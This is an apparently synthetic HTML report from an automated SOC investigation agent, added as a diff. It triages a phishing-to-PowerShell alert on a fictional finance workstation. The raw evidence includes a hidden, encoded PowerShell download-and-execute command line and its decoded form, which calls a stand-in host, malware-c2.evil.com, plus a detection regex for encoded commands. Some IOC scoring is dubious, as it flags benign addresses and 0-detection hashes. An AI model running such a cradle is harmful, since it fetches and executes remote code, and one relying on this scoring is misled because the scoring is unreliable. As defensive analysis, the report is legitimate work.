@@ -1,0 +1,992 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SOC Investigation Report — 5ead2fc7-2490-4df7-b3bb-c235fbd5af7f</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #0a0e1a;
+            color: #c8d6e5;
+            line-height: 1.6;
+            padding: 20px;
+        }
+        .container { max-width: 1100px; margin: 0 auto; }
+        .header {
+            text-align: center;
+            padding: 30px 0;
+            border-bottom: 2px solid #1a2332;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: #00ff88;
+            font-size: 28px;
+            letter-spacing: 2px;
+            font-family: 'Courier New', monospace;
+        }
+        .header .subtitle {
+            color: #00d4ff;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+        .header .meta {
+            color: #5a6c7d;
+            font-size: 12px;
+            margin-top: 10px;
+        }
+        .section {
+            background: #111827;
+            border: 1px solid #1e293b;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 24px;
+        }
+        .section h2 {
+            color: #00d4ff;
+            font-size: 18px;
+            margin-bottom: 16px;
+            padding-bottom: 8px;
+            border-bottom: 1px solid #1e293b;
+        }
+        .verdict-badge {
+            display: inline-block;
+            padding: 12px 32px;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-align: center;
+        }
+        .verdict-tp {
+            background: rgba(239, 68, 68, 0.2);
+            color: #ef4444;
+            border: 2px solid #ef4444;
+        }
+        .verdict-fp {
+            background: rgba(34, 197, 94, 0.2);
+            color: #22c55e;
+            border: 2px solid #22c55e;
+        }
+        .verdict-esc {
+            background: rgba(234, 179, 8, 0.2);
+            color: #eab308;
+            border: 2px solid #eab308;
+        }
+        .confidence-bar {
+            height: 8px;
+            background: #1e293b;
+            border-radius: 4px;
+            margin-top: 8px;
+            overflow: hidden;
+        }
+        .confidence-fill {
+            height: 100%;
+            border-radius: 4px;
+            transition: width 0.5s;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 12px;
+        }
+        th, td {
+            padding: 10px 14px;
+            text-align: left;
+            border-bottom: 1px solid #1e293b;
+            font-size: 13px;
+        }
+        th {
+            background: #0f172a;
+            color: #00d4ff;
+            font-weight: 600;
+            text-transform: uppercase;
+            font-size: 11px;
+            letter-spacing: 1px;
+        }
+        tr:hover { background: rgba(0, 212, 255, 0.05); }
+        .tag {
+            display: inline-block;
+            padding: 2px 8px;
+            background: rgba(0, 255, 136, 0.1);
+            color: #00ff88;
+            border-radius: 3px;
+            font-size: 11px;
+            margin: 2px;
+        }
+        .risk-high { color: #ef4444; }
+        .risk-medium { color: #eab308; }
+        .risk-low { color: #22c55e; }
+        .timeline-item {
+            padding: 12px 0 12px 24px;
+            border-left: 2px solid #1e293b;
+            position: relative;
+            margin-left: 10px;
+        }
+        .timeline-item::before {
+            content: '';
+            position: absolute;
+            left: -6px;
+            top: 16px;
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #00ff88;
+        }
+        .timeline-item .stage {
+            color: #00d4ff;
+            font-weight: 600;
+            font-size: 13px;
+        }
+        .timeline-item .detail {
+            color: #8899aa;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .reasoning-item {
+            padding: 8px 12px;
+            background: #0f172a;
+            border-left: 3px solid #00d4ff;
+            margin-bottom: 8px;
+            font-size: 13px;
+        }
+        .action-item {
+            padding: 8px 12px;
+            background: #0f172a;
+            border-left: 3px solid #00ff88;
+            margin-bottom: 6px;
+            font-size: 13px;
+        }
+        .raw-content {
+            background: #0a0e1a;
+            border: 1px solid #1e293b;
+            padding: 16px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            max-height: 400px;
+            overflow-y: auto;
+            color: #8899aa;
+        }
+        .mitre-link {
+            color: #00d4ff;
+            text-decoration: none;
+        }
+        .mitre-link:hover { text-decoration: underline; }
+        .executive-summary {
+            font-size: 15px;
+            color: #e2e8f0;
+            line-height: 1.8;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #4a5568;
+            font-size: 11px;
+            border-top: 1px solid #1e293b;
+            margin-top: 30px;
+        }
+        @media print {
+            body { background: #fff; color: #333; }
+            .section { border-color: #ddd; background: #f9f9f9; }
+            .header h1 { color: #1a1a2e; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>[ SOC-AI-AGENT ]</h1>
+            <div class="subtitle">Automated Investigation Report</div>
+            <div class="meta">
+                Alert ID: 5ead2fc7-2490-4df7-b3bb-c235fbd5af7f | Generated: 2026-02-13 04:13:54 UTC
+            </div>
+        </div>
+
+        <!-- Executive Summary -->
+        <div class="section">
+            <h2>Executive Summary</h2>
+            <div class="executive-summary">
+                
+                    Verdict: TRUE_POSITIVE (80.225% confidence) — confirmed malicious activity. Key factors: IOC de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c flagged by 1 source(s) (risk score: 100.0). IOC 04029e121a0cfa5991749937dd22a1d9 flagged by 1 source(s) (risk score: 70.0). IOC 1.0.0.0 flagged by 1 source(s) (risk score: 51.5).
+                
+            </div>
+        </div>
+
+        <!-- Verdict -->
+        <div class="section" style="text-align: center;">
+            <h2>Verdict</h2>
+            
+                
+                    <div class="verdict-badge verdict-tp">TRUE POSITIVE</div>
+                
+                <div style="margin-top: 16px; font-size: 24px; color: #e2e8f0;">
+                    Confidence: 80.2%
+                </div>
+                <div class="confidence-bar" style="max-width: 400px; margin: 12px auto;">
+                    
+                        <div class="confidence-fill" style="width: 80.2%; background: #ef4444;"></div>
+                    
+                </div>
+            
+        </div>
+
+        <!-- Alert Details -->
+        <div class="section">
+            <h2>Alert Details</h2>
+            <table>
+                <tr><th style="width: 180px;">Field</th><th>Value</th></tr>
+                <tr><td>Alert Type</td><td>sysmon</td></tr>
+                <tr><td>Timestamp</td><td>2024-01-15T09:17:46.531000</td></tr>
+                <tr><td>Classification</td><td>c2_communication</td></tr>
+                <tr><td>Initial Severity</td><td>HIGH</td></tr>
+                
+                    <tr><td>Source IP</td><td>10.0.2.47</td></tr>
+                    <tr><td>Destination IP</td><td>198.51.100.73</td></tr>
+                    <tr><td>Source Host</td><td>FINANCE-WS04.corp.acme.local</td></tr>
+                    <tr><td>User</td><td>ACME\mthompson</td></tr>
+                    <tr><td>Process</td><td>C:\Users\mthompson\AppData\Local\Temp\payload.exe</td></tr>
+                    <tr><td>Command Line</td><td style="font-family: monospace; font-size: 12px;">&#34;C:\Users\mthompson\AppData\Local\Temp\payload.exe&#34;</td></tr>
+                    <tr><td>Parent Process</td><td>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td></tr>
+                
+            </table>
+        </div>
+
+        <!-- Investigation Timeline -->
+        
+        <div class="section">
+            <h2>Investigation Timeline</h2>
+            
+            <div class="timeline-item">
+                <div class="stage">Triage — Complete</div>
+                <div class="detail">Classified as c2_communication. Severity: HIGH.</div>
+            </div>
+            
+            <div class="timeline-item">
+                <div class="stage">Ioc Extraction — Complete</div>
+                <div class="detail">Extracted 17 IOCs: {&#39;sha256&#39;: 1, &#39;md5&#39;: 4, &#39;url&#39;: 2, &#39;ipv4&#39;: 2, &#39;domain&#39;: 2, &#39;file_path_windows&#39;: 6}</div>
+            </div>
+            
+            <div class="timeline-item">
+                <div class="stage">Enrichment — Complete</div>
+                <div class="detail">Enriched 17 IOCs across threat intel sources.</div>
+            </div>
+            
+            <div class="timeline-item">
+                <div class="stage">Correlation — Complete</div>
+                <div class="detail">Found 5 related investigation(s). Shared IOCs: http://schemas.microsoft.com/win/2004/08/events/event (seen 3x), 04029e121a0cfa5991749937dd22a1d9 (seen 1x), 1.0.0.0 (seen 1x). 1 related investigation(s) were previously confirmed as true positives. This significantly increases the likelihood of this alert being malicious.</div>
+            </div>
+            
+            <div class="timeline-item">
+                <div class="stage">Att&amp;ck Mapping — Complete</div>
+                <div class="detail">Matched 6 techniques across 4 tactics.</div>
+            </div>
+            
+            <div class="timeline-item">
+                <div class="stage">Verdict — Complete</div>
+                <div class="detail">TRUE_POSITIVE (confidence: 80.2%)</div>
+            </div>
+            
+        </div>
+        
+
+        <!-- IOC Enrichment -->
+        
+        <div class="section">
+            <h2>IOC Enrichment Results</h2>
+            <table>
+                <tr>
+                    <th>IOC</th>
+                    <th>Type</th>
+                    <th>Risk Score</th>
+                    <th>Sources Flagged</th>
+                    <th>Summary</th>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c</td>
+                    <td><span class="tag">sha256</span></td>
+                    <td>
+                        
+                            <span class="risk-high">100.0</span>
+                        
+                    </td>
+                    <td>1 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/76 detections. Type: Win32 EXE, Names: powershell.exe, PowerShell.EXE, POWERSHELL<br>
+                        
+                            OTX: 18 pulses reference this IOC. Tags: february, cain, iocs, choose uptycs, powershell<br>
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">04029e121a0cfa5991749937dd22a1d9</td>
+                    <td><span class="tag">md5</span></td>
+                    <td>
+                        
+                            <span class="risk-high">70.0</span>
+                        
+                    </td>
+                    <td>1 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/76 detections. Type: Win32 EXE, Names: powershell.exe, CPU.exe, xkn.exe<br>
+                        
+                            OTX: 7 pulses reference this IOC. Tags: 16 23, wcry, cobalt strike, 67 152, 27 7265<br>
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">f2c0e8a5bd10dbc167e85c065e0b4bef</td>
+                    <td><span class="tag">md5</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            
+                        
+                            OTX: 0 pulses reference this IOC. Tags: none<br>
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">4a8b2c6d0e2f4a6b8c0d2e4f6a8b0c2d</td>
+                    <td><span class="tag">md5</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            
+                        
+                            OTX: 0 pulses reference this IOC. Tags: none<br>
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">b18cc5c6e8e7a408b83ae898c89c0053</td>
+                    <td><span class="tag">md5</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            
+                        
+                            OTX: 0 pulses reference this IOC. Tags: none<br>
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">http://schemas.microsoft.com/win/2004/08/events/event</td>
+                    <td><span class="tag">url</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/94 engines flagged URL as malicious.<br>
+                        
+                            
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">http://malware-c2.evil.com/payload.exe</td>
+                    <td><span class="tag">url</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 3</td>
+                    <td style="font-size: 12px;">
+                        
+                            
+                        
+                            
+                        
+                            
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">198.51.100.73</td>
+                    <td><span class="tag">ipv4</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 5</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/93 engines flagged as malicious. AS: N/A, Country: N/A<br>
+                        
+                            AbuseIPDB: Abuse confidence 0%, 0 reports. ISP: None, Usage: Reserved, Country: None<br>
+                        
+                            
+                        
+                            OTX: 0 pulses reference this IOC. Tags: none<br>
+                        
+                            GreyNoise: IP not observed scanning the internet<br>
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">1.0.0.0</td>
+                    <td><span class="tag">ipv4</span></td>
+                    <td>
+                        
+                            <span class="risk-medium">51.5</span>
+                        
+                    </td>
+                    <td>1 / 5</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/93 engines flagged as malicious. AS: CLOUDFLARENET, Country: N/A<br>
+                        
+                            AbuseIPDB: Abuse confidence 3%, 1 reports. ISP: APNIC and Cloudflare DNS Resolver project, Usage: Content Delivery Network, Country: AU<br>
+                        
+                            
+                        
+                            OTX: 50 pulses reference this IOC. Tags: archivesha1, archivesha256, powershell, desktop, look<br>
+                        
+                            GreyNoise: IP not observed scanning the internet<br>
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">schemas.microsoft.com</td>
+                    <td><span class="tag">domain</span></td>
+                    <td>
+                        
+                            <span class="risk-low">15.0</span>
+                        
+                    </td>
+                    <td>0 / 4</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/93 engines flagged as malicious. Registrar: N/A<br>
+                        
+                            OTX: 0 pulses reference this IOC. Tags: none<br>
+                        
+                            
+                        
+                            WHOIS: Registrar=MarkMonitor, Inc., Created=1991-05-02 04:00:00, Expires=2027-05-03 04:00:00, Country=N/A<br>
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">malware-c2.evil.com</td>
+                    <td><span class="tag">domain</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 4</td>
+                    <td style="font-size: 12px;">
+                        
+                            VT: 0/93 engines flagged as malicious. Registrar: Network Solutions, LLC<br>
+                        
+                            OTX: 0 pulses reference this IOC. Tags: none<br>
+                        
+                            
+                        
+                            WHOIS: Registrar=Network Solutions, LLC, Created=1995-04-10 04:00:00, Expires=2031-04-11 04:00:00, Country=N/A<br>
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</td>
+                    <td><span class="tag">file_path_windows</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 0</td>
+                    <td style="font-size: 12px;">
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">C:\Users\mthompson\Documents</td>
+                    <td><span class="tag">file_path_windows</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 0</td>
+                    <td style="font-size: 12px;">
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">C:\Program</td>
+                    <td><span class="tag">file_path_windows</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 0</td>
+                    <td style="font-size: 12px;">
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">C:\Users\mthompson\Documents\Q4_Financial_Review_URGENT.docm</td>
+                    <td><span class="tag">file_path_windows</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 0</td>
+                    <td style="font-size: 12px;">
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">C:\Users\mthompson\AppData\Local\Temp\payload.exe</td>
+                    <td><span class="tag">file_path_windows</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 0</td>
+                    <td style="font-size: 12px;">
+                        
+                    </td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">C:\Users\mthompson\AppData\Local\Temp</td>
+                    <td><span class="tag">file_path_windows</span></td>
+                    <td>
+                        
+                            <span class="risk-low">0.0</span>
+                        
+                    </td>
+                    <td>0 / 0</td>
+                    <td style="font-size: 12px;">
+                        
+                    </td>
+                </tr>
+                
+            </table>
+        </div>
+        
+
+        <!-- MITRE ATT&CK Mapping -->
+        
+        <div class="section">
+            <h2>MITRE ATT&CK Mapping</h2>
+            <table>
+                <tr>
+                    <th>Tactic</th>
+                    <th>Technique ID</th>
+                    <th>Technique Name</th>
+                    <th>Evidence</th>
+                </tr>
+                
+                <tr>
+                    <td>Execution</td>
+                    <td>
+                        <a class="mitre-link" href="https://attack.mitre.org/techniques/T1059/001/" target="_blank">
+                            T1059.001
+                        </a>
+                    </td>
+                    <td>Command and Scripting Interpreter: PowerShell</td>
+                    <td style="font-size: 12px; font-family: monospace;">powershell.exe</td>
+                </tr>
+                
+                <tr>
+                    <td>Defense Evasion</td>
+                    <td>
+                        <a class="mitre-link" href="https://attack.mitre.org/techniques/T1027/010/" target="_blank">
+                            T1027.010
+                        </a>
+                    </td>
+                    <td>Obfuscated Files or Information: Command Obfuscation</td>
+                    <td style="font-size: 12px; font-family: monospace;">-EncodedCommand </td>
+                </tr>
+                
+                <tr>
+                    <td>Defense Evasion</td>
+                    <td>
+                        <a class="mitre-link" href="https://attack.mitre.org/techniques/T1036/005/" target="_blank">
+                            T1036.005
+                        </a>
+                    </td>
+                    <td>Masquerading: Match Legitimate Name or Location</td>
+                    <td style="font-size: 12px; font-family: monospace;">\Temp\payload.exe 1.0.0.0    svchost</td>
+                </tr>
+                
+                <tr>
+                    <td>Defense Evasion</td>
+                    <td>
+                        <a class="mitre-link" href="https://attack.mitre.org/techniques/T1036/" target="_blank">
+                            T1036
+                        </a>
+                    </td>
+                    <td>Masquerading</td>
+                    <td style="font-size: 12px; font-family: monospace;">\Temp\payload.exe 1.0.0.0    svchost</td>
+                </tr>
+                
+                <tr>
+                    <td>Initial Access</td>
+                    <td>
+                        <a class="mitre-link" href="https://attack.mitre.org/techniques/T1566/" target="_blank">
+                            T1566
+                        </a>
+                    </td>
+                    <td>Phishing</td>
+                    <td style="font-size: 12px; font-family: monospace;">Enrichment tag: phishing</td>
+                </tr>
+                
+                <tr>
+                    <td>Command and Control</td>
+                    <td>
+                        <a class="mitre-link" href="https://attack.mitre.org/techniques/T1090/" target="_blank">
+                            T1090
+                        </a>
+                    </td>
+                    <td>Proxy</td>
+                    <td style="font-size: 12px; font-family: monospace;">Enrichment tag: known-distributor</td>
+                </tr>
+                
+            </table>
+            
+            <div style="margin-top: 16px; padding: 12px; background: #0a0e1a; border-radius: 4px; font-size: 13px;">
+                Attack chain analysis:<br>  1. **Initial Access**: Phishing (T1566)<br>  2. **Execution**: Command and Scripting Interpreter: PowerShell (T1059.001)<br>  3. **Defense Evasion**: Obfuscated Files or Information: Command Obfuscation (T1027.010), Masquerading: Match Legitimate Name or Location (T1036.005), Masquerading (T1036)<br>  4. **Command and Control**: Proxy (T1090)
+            </div>
+            
+        </div>
+        
+
+        <!-- Correlation -->
+        
+        <div class="section">
+            <h2>Historical Correlation</h2>
+            <p style="margin-bottom: 12px;">Found 5 related investigation(s). Shared IOCs: http://schemas.microsoft.com/win/2004/08/events/event (seen 3x), 04029e121a0cfa5991749937dd22a1d9 (seen 1x), 1.0.0.0 (seen 1x). 1 related investigation(s) were previously confirmed as true positives. This significantly increases the likelihood of this alert being malicious.</p>
+            
+            <table>
+                <tr>
+                    <th>Alert ID</th>
+                    <th>Type</th>
+                    <th>Verdict</th>
+                    <th>Matching IOC</th>
+                    <th>Date</th>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">5023fdde...</td>
+                    <td>sysmon</td>
+                    <td>
+                        
+                            <span class="risk-medium">NEEDS_ESCALATION</span>
+                        
+                    </td>
+                    <td style="font-family: monospace; font-size: 12px;">04029e121a0cfa5991749937dd22a1d9</td>
+                    <td>2026-02-13T03:55:04.889713</td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">047f07d3...</td>
+                    <td>sysmon</td>
+                    <td>
+                        
+                            <span class="risk-medium">NEEDS_ESCALATION</span>
+                        
+                    </td>
+                    <td style="font-family: monospace; font-size: 12px;">1.0.0.0</td>
+                    <td>2026-02-13T04:00:26.462208</td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">0390d2d6...</td>
+                    <td>sysmon</td>
+                    <td>
+                        
+                            <span class="risk-medium">NEEDS_ESCALATION</span>
+                        
+                    </td>
+                    <td style="font-family: monospace; font-size: 12px;">http://schemas.microsoft.com/win/2004/08/events/event</td>
+                    <td>2026-02-13T04:01:06.335532</td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">b57401c7...</td>
+                    <td>sysmon</td>
+                    <td>
+                        
+                            <span class="risk-low">FALSE_POSITIVE</span>
+                        
+                    </td>
+                    <td style="font-family: monospace; font-size: 12px;">http://schemas.microsoft.com/win/2004/08/events/event</td>
+                    <td>2026-02-13T04:02:04.046647</td>
+                </tr>
+                
+                <tr>
+                    <td style="font-family: monospace; font-size: 12px;">a6461952...</td>
+                    <td>sysmon</td>
+                    <td>
+                        
+                            <span class="risk-high">TRUE_POSITIVE</span>
+                        
+                    </td>
+                    <td style="font-family: monospace; font-size: 12px;">http://schemas.microsoft.com/win/2004/08/events/event</td>
+                    <td>2026-02-13T04:02:10.151855</td>
+                </tr>
+                
+            </table>
+            
+        </div>
+        
+
+        <!-- Reasoning Chain -->
+        
+        <div class="section">
+            <h2>Reasoning Chain</h2>
+            
+            <div class="reasoning-item">IOC de96a6e69944335375dc1ac238336066889d9ffc7d73628ef4fe1b1b160ab32c flagged by 1 source(s) (risk score: 100.0).</div>
+            
+            <div class="reasoning-item">IOC 04029e121a0cfa5991749937dd22a1d9 flagged by 1 source(s) (risk score: 70.0).</div>
+            
+            <div class="reasoning-item">IOC 1.0.0.0 flagged by 1 source(s) (risk score: 51.5).</div>
+            
+            <div class="reasoning-item">Suspicious command pattern: -[Ee]ncoded[Cc]ommand|FromBase64String</div>
+            
+            <div class="reasoning-item">IOCs appeared in 1 previously confirmed true positive(s). Strong correlation with known malicious activity.</div>
+            
+            <div class="reasoning-item">IOCs correlated across 5 previous investigations.</div>
+            
+            <div class="reasoning-item">Attack chain spans 4 MITRE ATT&amp;CK tactics, indicating a sophisticated multi-stage attack.</div>
+            
+            <div class="reasoning-item">Matched 6 MITRE ATT&amp;CK technique(s) across 4 tactic(s).</div>
+            
+            <div class="reasoning-item">No temporal risk factors identified.</div>
+            
+
+            
+            <h3 style="color: #00d4ff; margin-top: 16px; font-size: 14px;">Score Breakdown</h3>
+            <table>
+                <tr><th>Component</th><th>Score</th><th>Weight</th><th>Weighted Score</th></tr>
+                
+                <tr>
+                    <td>Enrichment</td>
+                    <td>100</td>
+                    <td>35.0%</td>
+                    <td>35.0</td>
+                </tr>
+                
+                <tr>
+                    <td>Behavioral</td>
+                    <td>30.0</td>
+                    <td>25.0%</td>
+                    <td>7.5</td>
+                </tr>
+                
+                <tr>
+                    <td>Correlation</td>
+                    <td>35.0</td>
+                    <td>20.0%</td>
+                    <td>7.0</td>
+                </tr>
+                
+                <tr>
+                    <td>Mitre</td>
+                    <td>73</td>
+                    <td>15.0%</td>
+                    <td>10.9</td>
+                </tr>
+                
+                <tr>
+                    <td>Temporal</td>
+                    <td>0.0</td>
+                    <td>5.0%</td>
+                    <td>0.0</td>
+                </tr>
+                
+            </table>
+            
+        </div>
+        
+
+        <!-- Recommended Actions -->
+        
+        <div class="section">
+            <h2>Recommended Response Actions</h2>
+            
+            <div class="action-item">1. Immediately isolate the affected host from the network.</div>
+            
+            <div class="action-item">2. Block source IP 10.0.2.47 at the firewall.</div>
+            
+            <div class="action-item">3. Reset credentials for user &#39;ACME\mthompson&#39;.</div>
+            
+            <div class="action-item">4. Review all recent activity for user &#39;ACME\mthompson&#39;.</div>
+            
+            <div class="action-item">5. Collect forensic evidence and preserve volatile data.</div>
+            
+            <div class="action-item">6. File incident report and notify security leadership.</div>
+            
+        </div>
+        
+
+        <!-- Raw Evidence -->
+        <div class="section">
+            <h2>Raw Evidence</h2>
+            <div class="raw-content">&lt;Events&gt;
+  &lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;
+    &lt;System&gt;
+      &lt;Provider Name=&#34;Microsoft-Windows-Sysmon&#34; Guid=&#34;{5770385F-C22A-43E0-BF4C-06F5698FFBD9}&#34;/&gt;
+      &lt;EventID&gt;1&lt;/EventID&gt;
+      &lt;Version&gt;5&lt;/Version&gt;
+      &lt;Level&gt;4&lt;/Level&gt;
+      &lt;Task&gt;1&lt;/Task&gt;
+      &lt;Opcode&gt;0&lt;/Opcode&gt;
+      &lt;Keywords&gt;0x8000000000000000&lt;/Keywords&gt;
+      &lt;TimeCreated SystemTime=&#34;2024-01-15T09:17:42.318Z&#34;/&gt;
+      &lt;EventRecordID&gt;98201&lt;/EventRecordID&gt;
+      &lt;Correlation/&gt;
+      &lt;Execution ProcessID=&#34;2844&#34; ThreadID=&#34;3160&#34;/&gt;
+      &lt;Channel&gt;Microsoft-Windows-Sysmon/Operational&lt;/Channel&gt;
+      &lt;Computer&gt;FINANCE-WS04.corp.acme.local&lt;/Computer&gt;
+      &lt;Security UserID=&#34;S-1-5-21-3541430928-2051711210-1391384369-1147&#34;/&gt;
+    &lt;/System&gt;
+    &lt;EventData&gt;
+      &lt;Data Name=&#34;RuleName&#34;&gt;technique_id=T1059.001,technique_name=PowerShell&lt;/Data&gt;
+      &lt;Data Name=&#34;UtcTime&#34;&gt;2024-01-15 09:17:42.301&lt;/Data&gt;
+      &lt;Data Name=&#34;ProcessGuid&#34;&gt;{C4D396A1-82FA-65A5-3B07-000000001E00}&lt;/Data&gt;
+      &lt;Data Name=&#34;ProcessId&#34;&gt;5184&lt;/Data&gt;
+      &lt;Data Name=&#34;Image&#34;&gt;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe&lt;/Data&gt;
+      &lt;Data Name=&#34;FileVersion&#34;&gt;10.0.19041.1 (WinBuild.160101.0800)&lt;/Data&gt;
+      &lt;Data Name=&#34;Description&#34;&gt;Windows PowerShell&lt;/Data&gt;
+      &lt;Data Name=&#34;Product&#34;&gt;Microsoft Windows Operating System&lt;/Data&gt;
+      &lt;Data Name=&#34;Company&#34;&gt;Microsoft Corporation&lt;/Data&gt;
+      &lt;Data Name=&#34;OriginalFileName&#34;&gt;PowerShell.EXE&lt;/Data&gt;
+      &lt;Data Name=&#34;CommandLine&#34;&gt;powershell.exe -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AbQBhAGwAdwBhAHIAZQAtAGMAMgAuAGUAdgBpAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQALgBlAHgAZQAnACkA&lt;/Data&gt;
+      &lt;Data Name=&#34;CurrentDirectory&#34;&gt;C:\Users\mthompson\Documents\&lt;/Data&gt;
+      &lt;Data Name=&#34;User&#34;&gt;ACME\mthompson&lt;/Data&gt;
+      &lt;Data Name=&#34;LogonGuid&#34;&gt;{C4D396A1-1E5A-65A5-C1F3-0A0000000000}&lt;/Data&gt;
+      &lt;Data Name=&#34;LogonId&#34;&gt;0xAF3C1&lt;/Data&gt;
+      &lt;Data Name=&#34;TerminalSessionId&#34;&gt;1&lt;/Data&gt;
+      &lt;Data Name=&#34;IntegrityLevel&#34;&gt;Medium&lt;/Data&gt;
+      &lt;Data Name=&#34;Hashes&#34;&gt;SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,MD5=04029E121A0CFA5991749937DD22A1D9,IMPHASH=F2C0E8A5BD10DBC167E85C065E0B4BEF&lt;/Data&gt;
+      &lt;Data Name=&#34;ParentProcessGuid&#34;&gt;{C4D396A1-82E1-65A5-3A07-000000001E00}&lt;/Data&gt;
+      &lt;Data Name=&#34;ParentProcessId&#34;&gt;4528&lt;/Data&gt;
+      &lt;Data Name=&#34;ParentImage&#34;&gt;C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE&lt;/Data&gt;
+      &lt;Data Name=&#34;ParentCommandLine&#34;&gt;&#34;C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE&#34; /n &#34;C:\Users\mthompson\Documents\Q4_Financial_Review_URGENT.docm&#34;&lt;/Data&gt;
+      &lt;Data Name=&#34;ParentUser&#34;&gt;ACME\mthompson&lt;/Data&gt;
+    &lt;/EventData&gt;
+  &lt;/Event&gt;
+
+  &lt;!-- Decoded EncodedCommand: IEX (New-Object Net.WebClient).DownloadString(&#39;hxxp://malware-c2[.]evil.com/payload.exe&#39;) --&gt;
+
+  &lt;Event xmlns=&#34;http://schemas.microsoft.com/win/2004/08/events/event&#34;&gt;
+    &lt;System&gt;
